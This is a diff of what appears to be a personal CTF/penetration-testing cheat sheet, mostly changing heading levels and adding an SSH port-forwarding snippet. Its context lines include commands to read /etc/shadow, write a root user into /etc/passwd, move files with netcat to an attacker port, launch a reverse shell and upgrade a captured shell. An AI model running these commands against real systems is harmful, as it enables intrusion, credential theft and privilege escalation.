@@ -1,15 +1,15 @@
 [back](../README.md)
-#### scan rpc port
+# scan rpc port
 ```
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
 ```
 ---
-#### scan from 1 to 100 ports with nc
+# scan from 1 to 100 ports with nc
 ```sh
 for i in {1..100};do nc $IP $i;echo "";done
 ```
 ---
-#### CVE-2016–3714
+# CVE-2016–3714
 
 ```
 cat > image.png << EOF
@@ -25,7 +25,7 @@ EOF
 ```
 ---
 
-#### Read file:
+# Read file:
 ```
 xxd -r file.txt 
 base64 /etc/shadow | base64 -d
@@ -45,24 +45,24 @@ cat .download.dat | xxd -r -p #like strings
 ```
 
 ---
-#### if command too long
+# if command too long
 ```python
 python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
 ```
 ---
-#### Decompress a gzip file:
+# Decompress a gzip file:
 ```sh
 gzip -d file.gz
 ```
 ---
-#### Change file without vim or nano
+# Change file without vim or nano
 ```sh
 cat > file << EOF 
 ....
 EOF
 ```
 ---
-#### php extensions to run revsell
+# php extensions to run revsell
 ```
 .php
 .php3
@@ -71,13 +71,13 @@ EOF
 .phtml
 ```
 ---
-#### broken png image
+# broken png image
 ```
 xxd thm.jpg | head
 printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
 ```
 ---
-#### NFS share
+# NFS share
 ```
 showmount -e $IP
 mkdir tmp/
@@ -85,25 +85,25 @@ sudo mount -t nfs 10.10.104.64: tmp
 tree tmp
 ```
 ---
-#### if 2049 port is open (mount)
+# if 2049 port is open (mount)
 ```
 showmount -e $IP
 mount -t nfs $IP:/mnt/backups /mnt/loot
 ```
 ---
-#### socat if open port
+# socat if open port
 ```python
 ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
 ```
 
 ---
-#### create new user in /etc/passwd with root
+# create new user in /etc/passwd with root
 
 ```
 echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
 ```
 ---
-#### File Transfer on `Netcat`
+# File Transfer on `Netcat`
 
 1. To download a file on the remote shell:
 
@@ -118,19 +118,19 @@ nc -l ATTACKER_PORT > [output_file_path]
 ```
 
 ---
-#### Transfer files using `scp`:
+# Transfer files using `scp`:
 
 ```
 scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 scp -i id_rsa user@$IP:/home/willow/user.jpg . 
 ```
 ---
-#### fix PATH in old ubuntu
+# fix PATH in old ubuntu
 ```
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 ---
-#### mount
+# mount
 ```sh
 sudo apt install nfs-common
 showmount -e $IP
@@ -138,7 +138,7 @@ sudo mkdir /mnt/nfs                                                             
 ```
 ---
 
-#### grep
+# grep
 ```sh
 locate seclist | grep <what>
 grep -Rwi "text"             # Recursively search for lines
@@ -163,12 +163,12 @@ grep -w 'root'               # only word root, not asdrootas
 ```
 
 ---
-#### ssh
+# ssh
 ```
 ssh-keygen -t rsa -q -f "$HOME/.ssh/id_rsa" -N ""
 ```
 ---
-#### ftp
+# ftp
 ```
 ftp -A $IP #connect anon
 
@@ -176,7 +176,7 @@ prompt off
 mget * #download all files
 ```
 ---
-#### vim
+# vim
 ```vim
 Shift+H     # Move cursor to the top of the screen.
 Shift+M     # Move cursor to the middle of the screen.
@@ -195,7 +195,7 @@ gf          # Open the file whose name is under the cursor, '^' to go back.
 gv          # Return to the previous selection after visual mode.
 ```
 ---
-#### tmux
+# tmux
 ```
 ctrl b d # сохранить сессию и выйти из нее
 cb p     # previous window
@@ -207,7 +207,7 @@ tmux new -s [name_of_new_window]
 cb :set -g mouse on
 ```
 ---
-#### magic numbers
+# magic numbers
 png
 ```
 89504E470D0A1A0A
@@ -219,20 +219,24 @@ GIF89a    474946383961
 ```
 
 ---
-#### mv multiple files
+# mv multiple files
 ```
 mv -t DESTINATION file1 file2 file3
 ```
 
 ---
 
-#### run shell as other user
+# run shell as other user
 ```
 sudo -u user bash
 ```
 ---
 
-#### shells
+# ssh port forwarding
+```sh
+ssh -L <my_port>:127.0.0.1:<port_of_remote_host> admin@1.1.1.1
+```
+# shells
 ```
 SHELL=/bin/bash script -q /dev/null
 python3 -c 'import pty;pty.spawn("/bin/bash")'
